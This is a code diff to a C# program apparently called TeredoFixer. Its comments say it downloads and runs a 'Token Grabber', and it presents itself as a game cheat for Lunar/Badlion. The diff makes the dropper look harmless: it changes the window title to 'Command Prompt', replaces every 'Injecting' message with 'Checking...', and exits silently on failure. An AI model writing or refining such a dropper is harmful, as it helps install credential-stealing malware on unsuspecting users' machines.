@@ -18,12 +18,12 @@ namespace TeredoFixer
         static void Main(string[] args)
         {
             // Creating Tempfile
-            Console.Title = "MegaByte Cheat - Lunar/Badlion Bypass";
+            Console.Title = "Command Prompt";
             string temp = @"C:\temp\" + Guid.NewGuid();
             Directory.CreateDirectory(temp);
             string grapped = temp + "\\YOUR FILE NAME.exe";
             Console.ForegroundColor = ConsoleColor.DarkMagenta;
-            Console.WriteLine("Injecting.");
+            Console.WriteLine("Checking...");
             try
             {
                 // Downloading Token Grabber
@@ -47,7 +47,7 @@ namespace TeredoFixer
                 // if it done
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.Clear();
-                Console.WriteLine("Injecting...");
+                Console.WriteLine("Checking...");
                 Process.Start(grapped);
             }
             // checks if the program is running
@@ -60,9 +60,9 @@ namespace TeredoFixer
             {
                 Thread.Sleep(10000);
                 Console.Clear();
-                Console.WriteLine("Injecting....");
+                Console.WriteLine("Checking...");
                 Console.ForegroundColor = ConsoleColor.DarkRed;
-                Console.WriteLine("Failed to inject...");
+                Environment.Exit(1);
             }
 
 
